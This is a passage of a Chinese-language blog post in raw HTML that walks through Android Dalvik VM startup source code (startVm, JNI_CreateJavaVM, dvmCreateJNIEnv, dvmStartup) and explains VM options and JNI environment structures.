class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">AndroidRuntime::startVm</span><span class="params">(JavaVM** pJavaVM, JNIEnv** pEnv)</span>&#123;  </span><br><span class="line">    <span class="type">int</span> result = <span class="number">-1</span>;   </span><br><span class="line">    JavaVMInitArgs initArgs;  </span><br><span class="line">    JavaVMOption opt;  </span><br><span class="line">    ...... </span><br><span class="line">    property_get(<span class="string">&quot;dalvik.vm.checkjni&quot;</span>, propBuf, <span class="string">&quot;&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(propBuf, <span class="string">&quot;true&quot;</span>) == <span class="number">0</span>) &#123;   </span><br><span class="line">        checkJni = <span class="literal">true</span>;   </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(propBuf, <span class="string">&quot;false&quot;</span>) != <span class="number">0</span>) &#123; </span><br><span class="line">        <span class="comment">/* property is neither true nor false; fall back on kernel parameter */</span> </span><br><span class="line">        property_get(<span class="string">&quot;ro.kernel.android.checkjni&quot;</span>, propBuf, <span class="string">&quot;&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span> (propBuf[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span>) &#123;      </span><br><span class="line">            checkJni = <span class="literal">true</span>;     </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;   </span><br><span class="line">    ......    </span><br><span class="line">    property_get(<span class="string">&quot;dalvik.vm.execution-mode&quot;</span>, propBuf, <span class="string">&quot;&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(propBuf, <span class="string">&quot;int:portable&quot;</span>) == <span class="number">0</span>) &#123; </span><br><span class="line">        executionMode = kEMIntPortable;  </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(propBuf, <span class="string">&quot;int:fast&quot;</span>) == <span class="number">0</span>) &#123; </span><br><span class="line">        executionMode = kEMIntFast;</span><br><span class="line">        <span class="meta">#<span class="keyword">if</span> defined(WITH_JIT)</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(propBuf, <span class="string">&quot;int:jit&quot;</span>) == <span class="number">0</span>) &#123;    </span><br><span class="line">        executionMode = kEMJitCompiler;</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span>   </span></span><br><span class="line">    &#125;   </span><br><span class="line">    property_get(<span class="string">&quot;dalvik.vm.stack-trace-file&quot;</span>, stackTraceFileBuf, <span class="string">&quot;&quot;</span>); </span><br><span class="line">    ......    </span><br><span class="line">    <span class="built_in">strcpy</span>(heapsizeOptsBuf, <span class="string">&quot;-Xmx&quot;</span>);   </span><br><span class="line">    property_get(<span class="string">&quot;dalvik.vm.heapsize&quot;</span>, heapsizeOptsBuf+<span class="number">4</span>, <span class="string">&quot;16m&quot;</span>);    </span><br><span class="line">    <span class="comment">//LOGI(&quot;Heap size: %s&quot;, heapsizeOptsBuf);   </span></span><br><span class="line">    opt.optionString = heapsizeOptsBuf; </span><br><span class="line">    mOptions.add(opt);  </span><br><span class="line">    ......   </span><br><span class="line">    <span class="keyword">if</span> (checkJni) &#123; </span><br><span class="line">        <span class="comment">/* extended JNI checking */</span>     </span><br><span class="line">        opt.optionString = <span class="string">&quot;-Xcheck:jni&quot;</span>; </span><br><span class="line">        mOptions.add(opt);     </span><br><span class="line">        ......    </span><br><span class="line">    &#125;  </span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">if</span> (executionMode == kEMIntPortable) &#123;   </span><br><span class="line">        opt.optionString = <span class="string">&quot;-Xint:portable&quot;</span>;  </span><br><span class="line">        mOptions.add(opt);    </span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (executionMode == kEMIntFast) &#123; </span><br><span class="line">        opt.optionString = <span class="string">&quot;-Xint:fast&quot;</span>;  </span><br><span class="line">        mOptions.add(opt);</span><br><span class="line">        <span class="meta">#<span class="keyword">if</span> defined(WITH_JIT)  </span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (executionMode == kEMJitCompiler) &#123;     </span><br><span class="line">        opt.optionString = <span class="string">&quot;-Xint:jit&quot;</span>;     </span><br><span class="line">        mOptions.add(opt);</span><br><span class="line">        <span class="meta">#<span class="keyword">endif</span>   </span></span><br><span class="line">    &#125;    </span><br><span class="line">    ......    </span><br><span class="line">    <span class="keyword">if</span> (stackTraceFileBuf[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;   </span><br><span class="line">        <span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* stfOptName = <span class="string">&quot;-Xstacktracefile:&quot;</span>; </span><br><span class="line">        stackTraceFile = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(stfOptName) +  <span class="built_in">strlen</span>(stackTraceFileBuf) + <span class="number">1</span>);       </span><br><span class="line">        <span class="built_in">strcpy</span>(stackTraceFile, stfOptName);      </span><br><span class="line">        <span class="built_in">strcat</span>(stackTraceFile, stackTraceFileBuf);   </span><br><span class="line">        opt.optionString = stackTraceFile;   </span><br><span class="line">        mOptions.add(opt);    </span><br><span class="line">    &#125;    </span><br><span class="line">    ......    </span><br><span class="line">    initArgs.options = mOptions.editArray(); </span><br><span class="line">    initArgs.nOptions = mOptions.size();  </span><br><span class="line">    ......    </span><br><span class="line">        <span class="comment">/*     * Initialize the VM.     *     </span></span><br><span class="line"><span class="comment">        * The JavaVM* is essentially per-process, and the JNIEnv* is per-thread.     </span></span><br><span class="line"><span class="comment">        * If this call succeeds, the VM is ready, and we can start issuing     </span></span><br><span class="line"><span class="comment">        * JNI calls.     */</span>   </span><br><span class="line">    <span class="keyword">if</span> (JNI_CreateJavaVM(pJavaVM, pEnv, &amp;initArgs) &lt; <span class="number">0</span>) &#123; </span><br><span class="line">        LOGE(<span class="string">&quot;JNI_CreateJavaVM failed\n&quot;</span>);  </span><br><span class="line">        <span class="keyword">goto</span> bail;   </span><br><span class="line">    &#125;    </span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    bail:    </span><br><span class="line">    <span class="built_in">free</span>(stackTraceFile);   </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在启动Dalvik虚拟机的时候，可以指定一系列的选项，这些选项可以通过特定的系统属性来指定。下面我们就简单了解几个可能有用的选项。</p><ul><li>-Xcheck:jni：用来启动JNI方法检查。我们在C/C++代码中，可以修改Java对象的成员变量或者调用Java对象的成员函数。加了-Xcheck:jni选项之后，就可以对要访问的Java对象的成员变量或者成员函数进行合法性检查，例如，检查类型是否匹配。我们可以通过dalvik.vm.checkjni或者ro.kernel.android.checkjni这两个系统属性来指定是否要启用-Xcheck:jni选项。注意，加了-Xcheck:jni选项之后，会使用得JNI方法执行变慢。</li><li>-Xint:portable，-Xint:fast，-Xint:jit：用来指定Dalvik虚拟机的执行模式。Dalvik虚拟机支持三种运行模式，分别是Portable、Fast和Jit。Portable是指Dalvik虚拟机以可移植的方式来进行编译，也就是说，编译出来的虚拟机可以在任意平台上运行。Fast是针对当前平台对Dalvik虚拟机进行编译，这样编译出来的Dalvik虚拟机可以进行特殊的优化，从而使得它能更快地运行程序。Jit不是解释执行代码，而是将代码动态编译成本地语言后再执行。我们可以通过dalvik.vm.execution-mode系统属性来指定Dalvik虚拟机的解释模式。</li><li>-Xstacktracefile：用来指定调用堆栈输出文件。Dalvik虚拟机接收到SIGQUIT（Ctrl-\或者kill -3）信号之后，会将所有线程的调用堆栈输出来，默认是输出到日志里面。指定了-Xstacktracefile选项之后，就可以将线程的调用堆栈输出到指定的文件中去。我们可以通过dalvik.vm.stack-trace-file系统属性来指定调用堆栈输出文件。</li><li>-Xmx：用来指定Java对象堆的最大值。Dalvik虚拟机的Java对象堆的默认最大值是16M，不过我们可以通过dalvik.vm.heapsize系统属性来指定为其它值。</li></ul><p>设置好Dalvik虚拟机的启动选项之后，AndroidRuntime的成员函数<code>startVm()</code>就会调用另外一个函数<code>JNI_CreateJavaVM()</code>来创建以及初始化一个Dalvik虚拟机实例。</p><h4 id="1-2-1-3-JNI-CreateJavaVM"><a href="#1-2-1-3-JNI-CreateJavaVM" class="headerlink" title="1.2.1.3 JNI_CreateJavaVM()"></a>1.2.1.3 JNI_CreateJavaVM()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* * Create a new VM instance. *</span></span><br><span class="line"><span class="comment">* The current thread becomes the main VM thread.  We return immediately, </span></span><br><span class="line"><span class="comment">* which effectively means the caller is executing in a native method. */</span></span><br><span class="line">jint <span class="title function_">JNI_CreateJavaVM</span><span class="params">(JavaVM** p_vm, JNIEnv** p_env, <span class="type">void</span>* vm_args)</span>&#123;   </span><br><span class="line">    <span class="type">const</span> JavaVMInitArgs* args = (JavaVMInitArgs*) vm_args;  </span><br><span class="line">    JNIEnvExt* pEnv = <span class="literal">NULL</span>;  </span><br><span class="line">    JavaVMExt* pVM = <span class="literal">NULL</span>; </span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>** argv;  </span><br><span class="line">    <span class="type">int</span> argc = <span class="number">0</span>;  </span><br><span class="line">    ......    </span><br><span class="line">    <span class="comment">/* zero globals; not strictly necessary the first time a VM is started */</span>    </span><br><span class="line">    <span class="built_in">memset</span>(&amp;gDvm, <span class="number">0</span>, <span class="keyword">sizeof</span>(gDvm));    </span><br><span class="line">    <span class="comment">/*     * Set up structures for JNIEnv and VM.     */</span>    </span><br><span class="line">    <span class="comment">//pEnv = (JNIEnvExt*) malloc(sizeof(JNIEnvExt));   </span></span><br><span class="line">    pVM = (JavaVMExt*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(JavaVMExt));   </span><br><span class="line">    <span class="built_in">memset</span>(pVM, <span class="number">0</span>, <span class="keyword">sizeof</span>(JavaVMExt));    </span><br><span class="line">    pVM-&gt;funcTable = &amp;gInvokeInterface;    </span><br><span class="line">    pVM-&gt;envList = pEnv;   </span><br><span class="line">    ......    </span><br><span class="line">    argv = (<span class="type">const</span> <span class="type">char</span>**) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>*) * (args-&gt;nOptions));  </span><br><span class="line">    <span class="built_in">memset</span>(argv, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">char</span>*) * (args-&gt;nOptions)); </span><br><span class="line">    ......   </span><br><span class="line">    <span class="comment">/*     * Convert JNI args to argv.     *   </span></span><br><span class="line"><span class="comment">    * We have to pull out vfprintf/exit/abort, because they use the  </span></span><br><span class="line"><span class="comment">    * &quot;extraInfo&quot; field to pass function pointer &quot;hooks&quot; in.  We also </span></span><br><span class="line"><span class="comment">    * look for the -Xcheck:jni stuff here.     */</span>    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; args-&gt;nOptions; i++) &#123;   </span><br><span class="line">        ......  </span><br><span class="line">    &#125;   </span><br><span class="line">    ......    </span><br><span class="line">    <span class="comment">/* set this up before initializing VM, so it can create some JNIEnvs */</span>    </span><br><span class="line">    gDvm.vmList = (JavaVM*) pVM;   </span><br><span class="line">    <span class="comment">/*     * Create an env for main thread.  We need to have something set up   </span></span><br><span class="line"><span class="comment">    * here because some of the class initialization we do when starting   </span></span><br><span class="line"><span class="comment">    * up the VM will call into native code.     */</span>    </span><br><span class="line">    pEnv = (JNIEnvExt*) dvmCreateJNIEnv(<span class="literal">NULL</span>);   </span><br><span class="line">    <span class="comment">/* initialize VM */</span>    </span><br><span class="line">    gDvm.initializing = <span class="literal">true</span>; </span><br><span class="line">    <span class="keyword">if</span> (dvmStartup(argc, argv, args-&gt;ignoreUnrecognized, (JNIEnv*)pEnv) != <span class="number">0</span>) &#123;   </span><br><span class="line">        <span class="built_in">free</span>(pEnv); </span><br><span class="line">        <span class="built_in">free</span>(pVM);   </span><br><span class="line">        <span class="keyword">goto</span> bail;   </span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="comment">/*     * Success!  Return stuff to caller.     */</span>   </span><br><span class="line">    dvmChangeStatus(<span class="literal">NULL</span>, THREAD_NATIVE);  </span><br><span class="line">    *p_env = (JNIEnv*) pEnv; </span><br><span class="line">    *p_vm = (JavaVM*) pVM;  </span><br><span class="line">    result = JNI_OK;bail: </span><br><span class="line">    gDvm.initializing = <span class="literal">false</span>;  </span><br><span class="line">    <span class="keyword">if</span> (result == JNI_OK)     </span><br><span class="line">        LOGV(<span class="string">&quot;JNI_CreateJavaVM succeeded\n&quot;</span>);  </span><br><span class="line">    <span class="keyword">else</span>       </span><br><span class="line">        LOGW(<span class="string">&quot;JNI_CreateJavaVM failed\n&quot;</span>);  </span><br><span class="line">    <span class="built_in">free</span>(argv); </span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JNI_CreateJavaVM主要完成以下4件事情：</p><ul><li>为当前进程创建一个Dalvik虚拟机实例，即一个JavaVMExt对象。</li><li>为当前线程创建和初始化一个JNI环境，即一个JNIEnvExt对象，这是通过调用函数<code>dvmCreateJNIEnv()</code>来完成的。</li><li>将参数vm_args所描述的Dalvik虚拟机启动选项拷贝到变量argv所描述的一个字符串数组中去，并且调用函数<code>dvmStartup()</code>来初始化前面所创建的Dalvik虚拟机实例。</li><li>调用函数<code>dvmChangeStatus()</code>将当前线程的状态设置为正在执行NATIVE代码，并且将面所创建和初始化好的JavaVMExt对象和JNIEnvExt对象通过输出参数p_vm和p_env返回给调用者。</li></ul><p>gDvm是一个类型为DvmGlobals的全局变量，用来收集当前进程所有虚拟机相关的信息，其中，它的成员变量vmList指向的就是当前进程中的Dalvik虚拟机实例，即一个JavaVMExt对象。以后每当需要访问当前进程中的Dalvik虚拟机实例时，就可以通过全局变量gDvm的成员变量vmList来获得，避免了在函数之间传递该Dalvik虚拟机实例。</p><p>每一个Dalvik虚拟机实例都有一个函数表，保存在对应的JavaVMExt对象的成员变量funcTable中，而这个函数表又被指定为gInvokeInterface。gInvokeInterface是一个类型为JNIInvokeInterface的结构体，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">JNIInvokeInterface</span> <span class="title">gInvokeInterface</span> =</span> &#123; </span><br><span class="line">    <span class="literal">NULL</span>,  </span><br><span class="line">    <span class="literal">NULL</span>,   </span><br><span class="line">    <span class="literal">NULL</span>,   </span><br><span class="line">    DestroyJavaVM,  </span><br><span class="line">    AttachCurrentThread,  </span><br><span class="line">    DetachCurrentThread, </span><br><span class="line">    GetEnv,   </span><br><span class="line">    AttachCurrentThreadAsDaemon,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>有了这个Dalvik虚拟机函数表之后，我们就可以将当前线程Attach或者Detach到Dalvik虚拟机中去，或者销毁当前进程的Dalvik虚拟机等。</p><p>每一个Dalvik虚拟机实例还有一个JNI环境列表，保存在对应的JavaVMExt对象的成员变量envList中。注意，JavaVMExt对象的成员变量envList描述的是一个JNIEnvExt列表，其中，每一个Attach到Dalvik虚拟机中去的线程都有一个对应的JNIEnvExt，用来描述它的JNI环境。有了这个JNI环境之后，我们才可以在Java函数和C/C++函数之间互相调用。</p><p>每一个JNIEnvExt对象都有两个成员变量prev和next，它们均是一个JNIEnvExt指针，分别指向前一个JNIEnvExt对象和后一个JNIEnvExt对象，也就是说，每一个Dalvik虚拟机实例的成员变量envList描述的是一个双向JNIEnvExt列表，其中，列表中的第一个JNIEnvExt对象描述的是主线程的JNI环境。</p><h4 id="1-2-1-4-dvmCreateJNIEnv"><a href="#1-2-1-4-dvmCreateJNIEnv" class="headerlink" title="1.2.1.4 dvmCreateJNIEnv()"></a>1.2.1.4 dvmCreateJNIEnv()</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* * Create a new JNIEnv struct and add it to the VM&#x27;s list. * </span></span><br><span class="line"><span class="comment">* &quot;self&quot; will be NULL for the main thread, since the VM hasn&#x27;t started </span></span><br><span class="line"><span class="comment">* yet; the value will be filled in later. */</span></span><br><span class="line">JNIEnv* <span class="title function_">dvmCreateJNIEnv</span><span class="params">(Thread* self)</span>&#123;  </span><br><span class="line">    JavaVMExt* vm = (JavaVMExt*) gDvm.vmList;    </span><br><span class="line">    JNIEnvExt* newEnv;  </span><br><span class="line">    ......   </span><br><span class="line">    newEnv = (JNIEnvExt*) <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(JNIEnvExt));</span><br><span class="line">    newEnv-&gt;funcTable = &amp;gNativeInterface;   </span><br><span class="line">    newEnv-&gt;vm = vm;  </span><br><span class="line">    ......   </span><br><span class="line">    <span class="keyword">if</span> (self != <span class="literal">NULL</span>) &#123;       </span><br><span class="line">        dvmSetJniEnvThreadId((JNIEnv*) newEnv, self);   </span><br><span class="line">        assert(newEnv-&gt;envThreadId != <span class="number">0</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* make it obvious if we fail to initialize these later */</span>       </span><br><span class="line">        newEnv-&gt;envThreadId = <span class="number">0x77777775</span>;   </span><br><span class="line">        newEnv-&gt;self = (Thread*) <span class="number">0x77777779</span>;  </span><br><span class="line">    &#125;    </span><br><span class="line">    ......    </span><br><span class="line">        <span class="comment">/* insert at head of list */</span>   </span><br><span class="line">    newEnv-&gt;next = vm-&gt;envList;   </span><br><span class="line">    assert(newEnv-&gt;prev == <span class="literal">NULL</span>);   </span><br><span class="line">    <span class="keyword">if</span> (vm-&gt;envList == <span class="literal">NULL</span>)            <span class="comment">// rare, but possible        </span></span><br><span class="line">        vm-&gt;envList = newEnv;    </span><br><span class="line">    <span class="keyword">else</span>        </span><br><span class="line">        vm-&gt;envList-&gt;prev = newEnv; </span><br><span class="line">    vm-&gt;envList = newEnv;  </span><br><span class="line">    ......    </span><br><span class="line">    <span class="keyword">return</span> (JNIEnv*) newEnv;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数<code>dvmCreateJNIEnv()</code>主要是执行了以下3个操作：</p><ul><li>创建一个JNIEnvExt对象，用来描述一个JNI环境，并且设置这个JNIEnvExt对象的宿主Dalvik虚拟机，以及所使用的本地接口表，即设置这个JNIEnvExt对象的成员变量funcTable和vm。这里的宿主Dalvik虚拟机即为当前进程的Dalvik虚拟机，它保存在全局变量gDvm的成员变量vmList中。本地接口表由全局变量gNativeInterface来描述。</li><li>参数self描述的是前面创建的JNIEnvExt对象要关联的线程，可以通过调用函数<code>dvmSetJniEnvThreadId()</code>来将它们关联起来。注意，当参数self的值等于NULL的时候，就表示前面的JNIEnvExt对象是要与主线程关联的，但是要等到后面再关联，因为现在用来描述主线程的Thread对象还没有准备好。通过将一个JNIEnvExt对象的成员变量envThreadId和self的值分别设置为0x77777775和0x77777779来表示它还没有与线程关联。</li><li><p>在一个Dalvik虚拟机里面，可以运行多个线程。所有关联有JNI环境的线程都有一个对应的JNIEnvExt对象，这些JNIEnvExt对象相互连接在一起保存在用来描述其宿主Dalvik虚拟机的一个JavaVMExt对象的成员变量envList中。因此，前面创建的JNIEnvExt对象需要连接到其宿主Dalvik虚拟机的JavaVMExt链表中去。</p><p>gNativeInterface是一个类型为JNINativeInterface的结构体，如下所示：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">JNINativeInterface</span> <span class="title">gNativeInterface</span> =</span> &#123; </span><br><span class="line">    ......        </span><br><span class="line">    FindClass,  </span><br><span class="line">    ......  </span><br><span class="line">    GetMethodID,     </span><br><span class="line">    ......    </span><br><span class="line">    CallObjectMethod,  </span><br><span class="line">    ......   </span><br><span class="line">    GetFieldID,  </span><br><span class="line">    ......      </span><br><span class="line">    SetIntField, </span><br><span class="line">    ......    </span><br><span class="line">    RegisterNatives,</span><br><span class="line">    UnregisterNatives,</span><br><span class="line">    ......    </span><br><span class="line">    GetJavaVM, </span><br><span class="line">    ......</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这一步执行完成之后，返回到前面的第3步中，即函数<code>JNI_CreateJavaVM()</code>中，接下来就会继续调用函数<code>dvmStartup()</code>来初始化前面所创建的Dalvik虚拟机实例。</p><h4 id="1-2-1-5-dvmStartup"><a href="#1-2-1-5-dvmStartup" class="headerlink" title="1.2.1.5 dvmStartup()"></a>1.2.1.5 dvmStartup()</h4><p>这个函数用来初始化Dalvik虚拟机，我们分段来阅读：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* * VM initialization.  Pass in any options provided on the command line. </span></span><br><span class="line"><span class="comment">* Do not pass in the class name or the options for the class. *</span></span><br><span class="line"><span class="comment">* Returns 0 on success. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dvmStartup</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span>* <span class="type">const</span> argv[], <span class="type">bool</span> ignoreUnrecognized,    JNIEnv* pEnv)</span>&#123;  </span><br><span class="line">    <span class="type">int</span> i, cc;   </span><br><span class="line">    ......   </span><br><span class="line">    setCommandLineDefaults();   </span><br><span class="line">    <span class="comment">/* prep properties storage */</span>    </span><br><span class="line">    <span class="keyword">if</span> (!dvmPropertiesStartup(argc))   </span><br><span class="line">        <span class="keyword">goto</span> fail;   </span><br><span class="line">    <span class="comment">/*     * Process the option flags (if any).     */</span> </span><br><span class="line">    cc = dvmProcessOptions(argc, argv, ignoreUnrecognized);  </span><br><span class="line">    <span class="keyword">if</span> (cc != <span class="number">0</span>) &#123;        </span><br><span class="line">        ......     </span><br><span class="line">        <span class="keyword">goto</span> fail;   </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这段代码用来处理Dalvik虚拟机的启动选项，这些启动选项保存在参数argv中，并且个数等于argc。在处理这些启动选项之前，还会执行以下两个操作：</p><ul><li>调用函数<code>setCommandLineDefaults()</code>来给Dalvik虚拟机设置默认参数，因为启动选项不一定会指定Dalvik虚拟机的所有属性。</li><li>调用函数<code>dvmPropertiesStartup()</code>来分配足够的内存空间来容纳由参数argv和argc所描述的启动选项。</li></ul><p>完成以上两个操作之后，就可以调用函数<code>dvmProcessOptions()</code>来处理参数argv和argc所描述的启动选项了，也就是根据这些选项值来设置Dalvik虚拟机的属性，例如，设置Dalvik虚拟机的Java对象堆的最大值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* configure signal handling */</span>   </span><br><span class="line"><span class="keyword">if</span> (!gDvm.reduceSignals)      </span><br><span class="line">    blockSignals();</span><br></pre></td></tr></table></figure><p>如果我们没有在Dalvik虚拟机的启动选项中指定-Xrs，那么gDvm.reduceSignals的值就会被设置为false，表示要在当前线程中屏蔽掉SIGQUIT信号。在这种情况下，会有一个线程专门用来处理SIGQUIT信号。这个线程在接收到SIGQUIT信号的时候，就会将各个线程的调用堆栈打印出来，因此，这个线程又称为dump-stack-trace线程。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*     * Initialize components.     */</span>    </span><br><span class="line"><span class="keyword">if</span> (!dvmAllocTrackerStartup())        </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="keyword">if</span> (!dvmGcStartup())  </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="keyword">if</span> (!dvmThreadStartup())    </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="keyword">if</span> (!dvmInlineNativeStartup())      </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="keyword">if</span> (!dvmVerificationStartup())      </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="keyword">if</span> (!dvmRegisterMapStartup())      </span><br><span class="line">    <span class="keyword">goto</span> fail;    </span><br><span class="line"><span class="keyword">if</span> (!dvmInstanceofStartup())      </span><br><span class="line">    <span class="keyword">goto</span> fail;   </span><br><span class="line"><span class="keyword">if</span> (!dvmClassStartup())     </span><br><span class="line">    <span 